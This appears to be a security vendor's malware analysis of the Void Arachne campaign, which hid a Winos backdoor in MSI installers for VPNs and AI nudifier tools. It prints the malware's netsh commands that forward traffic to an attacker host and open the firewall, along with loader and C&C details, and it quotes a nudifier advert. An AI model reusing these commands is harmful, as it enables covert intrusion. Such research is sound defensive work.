{
  "selected_chunks": [
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese"
        ],
        "content_type": "text",
        "token_length": 519,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "has_full_header_context": true,
        "Header 2": "",
        "Header 3": "",
        "Header 4": "",
        "chunk_id": 0,
        "total_chunks": 37
      },
      "length": 519
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Attack diagram",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Attack diagram"
        ],
        "content_type": "text",
        "token_length": 56,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 3": "",
        "Header 4": "",
        "chunk_id": 1,
        "total_chunks": 37
      },
      "length": 56
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Initial access",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Initial access"
        ],
        "content_type": "text",
        "token_length": 56,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 3": "",
        "Header 4": "",
        "chunk_id": 2,
        "total_chunks": 37
      },
      "length": 56
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Initial access",
        "Header 3": "### **SEO poisoning (T1608.006)**",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Initial access",
          "### **SEO poisoning (T1608.006)**"
        ],
        "content_type": "text",
        "token_length": 322,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 3,
        "total_chunks": 37
      },
      "length": 322
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Initial access",
        "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Initial access",
          "### **Targeting VPN-related technologies for spearphishing**"
        ],
        "content_type": "text",
        "token_length": 190,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 4,
        "total_chunks": 37
      },
      "length": 190
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Initial access",
        "Header 3": "### **Spearphishing through Telegram**",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Initial access",
          "### **Spearphishing through Telegram**"
        ],
        "content_type": "text",
        "token_length": 67,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 5,
        "total_chunks": 37
      },
      "length": 67
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### VPN-related Telegram channels  \nLike what’s being promoted in Void Arachne’s SEO poisoning campaign, we also observed the same malicious MSI files being shared in Chinese language-centric Telegram Channels. These channels are all related to VPN technology and the malicious MSI files were shared across several Telegram channels.  \nThis is like other campaigns we’ve observed wherein after threat actors conduct SEO-poisoning tactics, they then share links to these malicious sites or upload related files on social media and messaging applications.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Initial access",
        "Header 3": "### **Spearphishing through Telegram**",
        "Header 4": "#### VPN-related Telegram channels",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Initial access",
          "### **Spearphishing through Telegram**",
          "#### VPN-related Telegram channels"
        ],
        "content_type": "text",
        "token_length": 103,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "chunk_id": 6,
        "total_chunks": 37
      },
      "length": 103
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Malicious Simplified Chinese language packs for Telegram  \nA common malicious software package we observed is what appears to be a Telegram language pack for the Simplified Chinese language. (Telegram does offer a translation of its app in Simple Chinese, which may be found [here](https://translations.telegram.org/zh-hans/).)  \nUsing infected language packs as an infection vector is an interesting method, especially for the Chinese language, which has an estimated 1.3 billion native speakers. Some applications require language packs for a more localized user experience in regional markets, leaving these users potentially vulnerable to this kind of attack.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Initial access",
        "Header 3": "### **Spearphishing through Telegram**",
        "Header 4": "#### Malicious Simplified Chinese language packs for Telegram",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Initial access",
          "### **Spearphishing through Telegram**",
          "#### Malicious Simplified Chinese language packs for Telegram"
        ],
        "content_type": "text",
        "token_length": 128,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "chunk_id": 7,
        "total_chunks": 37
      },
      "length": 128
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Nudifier AI technologies promoted on Telegram channels  \nA concerning trend we have recently observed is the mass proliferation of nudifier applications that abuse AI to create AI-generated nonconsensual [deepfake](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/exploiting-ai-how-cybercriminals-misuse-abuse-ai-and-ml) pornography. These images and videos are often used in [sextortion](https://news.trendmicro.com/tag/sextortion/) schemes for further abuse, victim harassment, and financial gain.  \nFigure 6 shows a screenshot of a video on the Void Arachne Telegram channel where a photo of a woman was used to generate a deepfake pornographic video of using AI technology.  \nWe’ve observed that the threat actors pinned the malicious MSI file to the top of their Telegram channels to increase the chances of infecting users who are interested in using this type of technology.  \nThe malicious installer files are advertised on social media and Telegram channels and are intended to lure unsuspecting victims, potentially even minors. Based on an initial Simplified Chinese to English translation of their advertisement via Google Translate, the malicious actors are also targeting young individuals who are still in school with their use of the phrase “female classmate.”  \nJust have appropriate entertainment and satisfy your own lustful desires. Do not send it to the other party or harass the other party. Once you call the police, you will be in constant trouble! AI takes off clothes, you give me photos and I will make pictures for you. Do you want to see the female classmate you yearn for, the female colleague you have a crush on, the relatives and friends you eat and live with at home? Do you want to see them naked? Now you can realize your dream, you can see them naked and lustful for a pack of cigarette money.  \nA Simplified Chinese to English translation of an advertisement that promotes nudifiers or deepfake pornography-generating software on the threat actor’s Telegram channel  \nVoid Arachne also advertised AI technologies that could be used for [virtual kidnapping](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-can-perform-virtual-kidnapping-scams-using-ai-voice-cloning-tools-and-chatgpt), which is a novel deception campaign that uses misinformation through AI voice-alternating technology to pressure victims into paying ransom.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Initial access",
        "Header 3": "### **Spearphishing through Telegram**",
        "Header 4": "#### Nudifier AI technologies promoted on Telegram channels",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Initial access",
          "### **Spearphishing through Telegram**",
          "#### Nudifier AI technologies promoted on Telegram channels"
        ],
        "content_type": "text",
        "token_length": 545,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "chunk_id": 8,
        "total_chunks": 37
      },
      "length": 545
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n### **Spearphishing through Telegram**\n\n#### Voice-altering and face-swapping AI technologies promoted on Telegram  \nIn addition to fake nudifier applications, we saw additional channels advertising face-swapping and voice-changing software. Like the rise of nudifiers and deepfake-generating applications, we have also observed the rise of AI-powered apps that have face-swapping and voice-altering capabilities.  \nWe’ve found that malicious MSI files were shared and pinned on various AI video and voice manipulation Telegram channels.  \nFigure 10 shows a screen capture of a threat actor video posted on Void Arachne’s Telegram channel wherein the malicious actor can be seen using AI face- and voice-cloning technology on a WhatsApp call. Figure 12, on the other hand, shows a malicious voice-altering and face-swapping AI app installer on Telegram.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Initial access",
        "Header 3": "### **Spearphishing through Telegram**",
        "Header 4": "#### Voice-altering and face-swapping AI technologies promoted on Telegram",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Initial access",
          "### **Spearphishing through Telegram**",
          "#### Voice-altering and face-swapping AI technologies promoted on Telegram"
        ],
        "content_type": "text",
        "token_length": 166,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "chunk_id": 9,
        "total_chunks": 37
      },
      "length": 166
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\nThis sectiondiscusses our analysis of the malicious files associated with Void Arachne’s campaign, starting with the *letvpn.msi* file.  \nThe malicious MSI file uses Dynamic Link Libraries (DLLs) during the installation process. These DLLs play a pivotal role during runtime, facilitating various essential operations including property management within MSI packages, scheduling tasks, and configuring firewall rules.  \nThe MSI file performs several tasks, such as creating scheduled tasks and configuring firewall parameters. Specifically, we have observed the creation and configuration of firewall rules via the *OnFwConfig* and *OnFwInstall* functions from *NetFirewall.dll,* which are designed to whitelist both inbound and outbound traffic associated with the malware for the public network profile only.  \nFigure 16 shows the configuration of the inbound firewall rule created to enable unrestricted access for the malware when connected to public networks, ensuring that the malware can operate without interruption.  \nFurthermore, *letvpn.msi* drops multiple hidden files, including the *LetsPro.exe* loader, within the designated directory path *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\.* Subsequently, it initiates the execution of the LetsPRO loader.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### *Letvpn* MSI analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### *Letvpn* MSI analysis"
        ],
        "content_type": "text",
        "token_length": 261,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 11,
        "total_chunks": 37
      },
      "length": 261
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### *Letvpn* MSI analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5 hash** | **Parent directory** |\n| 1 | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe (Loader) | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0* |\n| LetsPRO.exe | 247272 | 7BB188DFEE179CBDE884A0E7D127B074 | *C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX* |",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### *Letvpn* MSI analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### *Letvpn* MSI analysis"
        ],
        "content_type": "table",
        "token_length": 168,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 12,
        "total_chunks": 37
      },
      "length": 168
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Trojan loader *LetsPro.exe* analysis\n\n*LetsPro.exe* is a trojan loader that decrypts, maps, and executes a second-stage payload in memory. The loader first reads and loads the content of a file named “1”, with the following content structure:  \nstruct payload\\_struct {\nuint32\\_t flag; // 1 if the data is encrypted, 0 if it's plaintext/Memory clean up\nuint32\\_t fileSize; // Size of the encrypted data in bytes\nchar encryptedData[]; // The encrypted payload\n};  \nIt then identifies the encrypted data section within the file. The initial part of the file structure contains a flag set to 1, which indicates encryption. The loader uses the Rivest Cipher 4 (RC4) algorithm with the key \"0x678E0B00\" to decrypt this data. After decryption, the payload, which is now executable code, is mapped into the process's memory space and executed.  \nThe decryption key structure is defined as follows:  \nstruct decryption\\_key\\_struct {\nuint32\\_t memory\\_cleanup; // Flag for memory cleanup after decryption\nuint32\\_t keySize; // Size of the decryption key\nchar key[]; // Decryption key\n};  \nThe following code snippet demonstrates the core part of the loader logic:  \nThe following snippet demonstrates the decrypted file 1 structure in memory:",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Trojan loader *LetsPro.exe* analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Trojan loader *LetsPro.exe* analysis"
        ],
        "content_type": "text",
        "token_length": 273,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 14,
        "total_chunks": 37
      },
      "length": 273
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nAfter the second-stage loader (file “1”) is executed and loaded into memory, the malware drops a Visual Basic Script (VBScript) designed to automate the creation of a scheduled task within Windows Task Scheduler to achieve persistence. The VBScript file will create a new scheduled task and configure task settings to run when a user is logged on to execute a specified batch file. Additionally, the malware creates a Windows service that starts with *CreateSvc\\_* to execute the VBScript file. At the time of research, the batch file was not available.  \nAfter that, the malware replicates the loader, VBScript, and the file “1” within the user directory.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Second-stage loader analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Second-stage loader analysis"
        ],
        "content_type": "text",
        "token_length": 141,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 16,
        "total_chunks": 37
      },
      "length": 141
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\n| --- | --- | --- | --- |\n| **File name** | **Size** | **MD5** | **Parent directory** |\n| *1* | 9996288 | D82362C15DDB7206010B8FCEC7F611C5 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *792258.vbs* | 2405 | CD95B5408531DC5342180A1BECE74757 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |\n| *LetsPRO.exe* | 40960 | FE7AEDAB70A5A58EFB84E6CB988D67A4 | *C:\\Users\\%USERNAME%\\<Random Directory Name>* |",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Second-stage loader analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Second-stage loader analysis"
        ],
        "content_type": "table",
        "token_length": 153,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 17,
        "total_chunks": 37
      },
      "length": 153
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Second-stage loader analysis\n\nThe malware also uses the *netsh* command to set up port forwarding and configure firewall rules named “Safe<integer>” on the victim’s machine, thereby whitelisting inbound and outbound traffic related to the malware for all network profiles.  \nIt establishes a rule for IPv4-to-IPv4 port forwarding. Specifically, it designates port 443 as the listening port on the local machine, where incoming connections will be received. It specifies a destination address (*103.214.147.14[.]webcamcn[.]xyz*), indicating where the forwarded traffic will be directed. Additionally, it designates port 443 on the destination server as the port to which the incoming traffic will be forwarded. This configuration redirects traffic from the local machine's port 443 to the specified destination address and port.  \nnetsh interface portproxy add v4tov4 listenport=443 connectaddress=103[.]214[.]147[.]14[.]webcamcn[.]xyz connectport=443  \nnetsh advfirewall firewall add rule name=\"Safe1\" dir=in action=allow program=\" C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VGX\\app-3.4.0\\LetsPRO.exe\"  \nFinally, the malware passes the execution to the Winos 4.0 stager in memory.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Second-stage loader analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Second-stage loader analysis"
        ],
        "content_type": "text",
        "token_length": 274,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 18,
        "total_chunks": 37
      },
      "length": 274
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n\n### Winos 4.0 C&C framework overview  \nThe final payload of this attack is the Winos 4.0 implant, which is written in C++ and targets the Windows platform. Winos has features that include file management, [distributed denial of service (DDoS)](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/cyber-attacks/security-101-distributed-denial-of-service-ddos-attacks) using TCP/UDP/ ICMP/HTTP, full disk search, webcam control, and screen capturing. Additionally, it supports many functionalities including process injection and microphone recording, system and service management, remote shell access, and keylogging functionalities, further enhancing its ability to control and monitor the infected system.  \nThe Winos C&C server is equipped with 23 internal plugins, each compiled in both 32- and 64-bit versions, to execute a variety of tasks. Table 3 shows the complete list of these plugins, along with their respective SHA256 hashes:",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Winos 4.0 C&C framework overview",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Winos 4.0 C&C framework overview"
        ],
        "content_type": "text",
        "token_length": 210,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 19,
        "total_chunks": 37
      },
      "length": 210
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 C&C framework overview\n\nSimilar to [Cobalt Strike](/en_us/research/21/g/tracking_cobalt_strike_a_vision_one_investigation.html) and Sliver, Winos supports custom plugins that can be developed by a threat actor. This allows the tool to extend its capabilities and add custom functionality. During our investigation, we found the following external and custom plugins for Winos 4.0 in the wild:",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Winos 4.0 C&C framework overview",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Winos 4.0 C&C framework overview"
        ],
        "content_type": "text",
        "token_length": 84,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 22,
        "total_chunks": 37
      },
      "length": 84
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nThe second stage loader discussed earlier executes the Winos stager payload, *上线模块.dll/exe* (which translates to *Online Module.dll/exe*). This module can be generated in both EXE and DLL formats. In this campaign, the attacker delivers a DLL implant. This module is responsible for downloading and executing the main implant, *登录模块.dll* (which translates to *LoginModule.dll*), on an infected system.  \nUpon execution, the stager reads and initializes its configuration. Notably, the configuration is in cleartext but is arranged in reverse order. The following is the fixed configuration setup:",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Winos 4.0 stager analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Winos 4.0 stager analysis"
        ],
        "content_type": "text",
        "token_length": 130,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 25,
        "total_chunks": 37
      },
      "length": 130
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\n| --- | --- | --- |\n| **Config** | **Description** | **Value** |\n| p1 | First C&C address | 127.0.0.1 |\n| o1 | First C&C port | 443 |\n| t1 | Communication protocol TCP/UDP | 1 (TCP) |\n| p2 | Second C&C address | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o2 | Second C&C port | 80 |\n| t2 | Communication protocol TCP/UDP | 1 (TCP) |\n| p3 | Third C&C address: Backup address in case p1 and p2 fail | 103[.]214[.]147[.]14[.]webcamcn[.]xyz |\n| o3 | Third port | 80 |\n| t3 | Communication protocol TCP/UDP | 0 (UDP) |\n| dd | Implant execution delay in seconds | 1 |\n| cl | C&C communication interval (beaconing) in seconds | 1 |\n| fz | Grouping | 默认 (Default) |\n| bb | Version | 1.0 |\n| bz | Comment: Default value is implant generation time | 2024. 4.18 |\n| jp | Keylogger | 0 |\n| sx | Anti-VM | 0 |\n| bh | End bluescreen | 0 |\n| ll | Antitraffic monitoring | 0 |\n| dl | Entry point | 0 |\n| sh | Process daemon | 0 |\n| kl | Process hollowing | 0 |\n| bd | - | 0 |",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Winos 4.0 stager analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Winos 4.0 stager analysis"
        ],
        "content_type": "table",
        "token_length": 306,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 28,
        "total_chunks": 37
      },
      "length": 306
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos 4.0 stager analysis\n\nTo communicate with its C&C server, the malware first needs to generate an encryption key to secure the communication. To generate this key, the malware calls the *timeGetTime()* Windows API function, which returns the system time in milliseconds, and appends “00 00 00 00 ca 00” to it. The data that needs to be transferred is then encrypted with this key and appended after the key.  \nFigure 28 is an example of an initial handshake between the stager and the C&C server. The malware encrypts and sends the hardcoded value “04 00” to its C&C server to indicate that this initial packet contains the key. The server then uses this session key for future communications.  \nThe encryption algorithm begins by preparing a block of data and a key, adjusting the buffer to ensure that there is sufficient space to work with both. The key is then appended to the beginning of the data that needs to be encrypted. The algorithm proceeds with the encryption process, which involves a loop that processes each byte of data. For each byte, a specific byte from the key is selected and transformed by taking its modulus with a hardcoded value (0x1C8) and then adding another hardcoded value (0x36) to it. This transformed key is then used to XOR with the current byte of the data, resulting in the encrypted byte that replaces the original byte in the data. Every ten bytes, the algorithm resets the pointer to the beginning of the key, ensuring that the key is reused cyclically.  \nIt should be noted that, based on our analysis, the value 0x1C8 remained the same in all the samples used in this campaign and several other attacks. However, we have observed that some variants found in the wild use different values, such as 0x7C5, indicating that this value might change from sample to sample. However, the value 0x36 remained the same in all the variants we analyzed.  \nNext, the C&C server responds with a magic value of “04” and a unique 16-byte identifier in UTF-16 format. In some Winos variants, this identifier is the MD5 hash of the DLL module that will be downloaded. Figure 30 is an example of the C&C server response to network traffic.  \nFigure 31 shows a decrypted packet data section.  \nThe stager then sends the next-stage payload plugin, named *登录模块.dll* (*LoginModule.dll*), to the C&C server.  \nFigure 33 shows the decrypted packet data section.  \nThe C&C server response contains the following information:  \n* Module name\n* Module hash\n* Binary loader shellcode\n* DLL module binary file  \nThe stager then saves the decrypted C&C server response (the plugin and its configuration) into the Windows Registry. It uses the name \"d33f351a4aeea5e608853d1a56661059\" and stores it under the key path *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit plugins or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit plugins.  \nFinally, to execute the module, the stager locates the shellcode section within the response received from the C&C server at offset 0xA44 and transfers control to the shellcode.",
      "metadata": {
        "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
        "Header 2": "## Technical analysis",
        "Header 3": "### Winos 4.0 stager analysis",
        "header_hierarchy": [
          "# Behind the Great Wall Void Arachne Targets Chinese",
          "## Technical analysis",
          "### Winos 4.0 stager analysis"
        ],
        "content_type": "text",
        "token_length": 660,
        "has_full_header_context": true,
        "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
        "Header 4": "",
        "chunk_id": 29,
        "total_chunks": 37
      },
      "length": 660
    },
    {
      "content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Technical analysis\n### Winos main implant analysis\n\nThe *登录模块.dll* (*LoginModule.dll*) is a fundamental component of Winos 4.0, serving as the core plugin manager for the system. This module is responsible for handling every action and command executed by the operator, which are transmitted via the C&C server as DLL plugins. These plugins extend the functionality of the implant.  \nUpon receiving the response from the C&C server, the implant stores these DLL plugins in the Windows registry paths *HKEY\\_CURRENT\\_USER\\Console\\0* for 32-bit systems or *HKEY\\_CURRENT\\_USER\\Console\\1* for 64-bit systems. Subsequently, the implant loads and uses these plugins to perform various tasks, enhancing its operational capabilities. This modular approach allows for a highly flexible and extensible framework, enabling the efficient execution of diverse functions as required by the operator.  \nOnce the *登录模块.dll* (*LoginModule.dll*) plugin is downloaded, the execution of this module is based on the previously mentioned configuration. The malware creates a thread to collect clipboard data and keystrokes. It also employs a specific mutex for this thread, which is named 测试备注 (*Test Notes*).  \nNext, the malware chooses one of the three available C&C configurations. 